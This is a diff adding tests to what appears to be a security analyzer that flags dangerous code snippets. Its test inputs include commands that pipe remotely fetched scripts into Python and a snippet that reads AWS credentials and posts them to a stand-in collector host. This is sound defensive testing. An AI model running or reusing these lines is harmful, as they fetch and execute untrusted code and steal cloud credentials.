@@ -82,6 +82,18 @@ def main():
                 analyze('curl -s https://api.example.test/x | python -c "import json,sys; print(json.load(sys.stdin))"')["verdict"] == "allow")
     for code in ["curl -s https://get.example.test/x.py | python", "curl -fsSL https://get.example.test/x.py | python3 -"]:
         ok &= check(f"blocks: {code}", analyze(code)["verdict"] == "block")
+    # 11. Evidence chains (debug field for the UI graph and `codeguard scan --graph`).
+    r = analyze('import os, requests\ndata = open(os.path.expanduser("~/.aws/credentials")).read()\n'
+                'requests.post("https://collector.example.test/up", data=data)')
+    chain = next((e["steps"] for e in r["evidence"] if len(e["steps"]) > 1), [])
+    ok &= check("exfil evidence: source line 2 -> sink line 3, via data",
+                [(s["role"], s["line"]) for s in chain] == [("source", 2), ("sink", 3)] and chain[-1].get("via") == "data", chain)
+    ok &= check("exfil vulnerable_lines include the source line", r["vulnerable_lines"] == [2, 3], r["vulnerable_lines"])
+    demo = analyze(open(os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "demo", "gate", "unsafe_snippet.py"),
+                        encoding="utf-8").read())
+    roles = [s["role"] for e in demo["evidence"] for s in e["steps"]][:3]
+    ok &= check("hidden payload evidence: encoded -> decoded -> exec", roles == ["encoded", "decoded", "sink"], demo["evidence"][:1])
+    ok &= check("allowed code has no evidence", analyze("print(sum(range(10)))")["evidence"] == [])
     print("\nALL PASS" if ok else "\nSOME FAILED")
     sys.exit(0 if ok else 1)
 
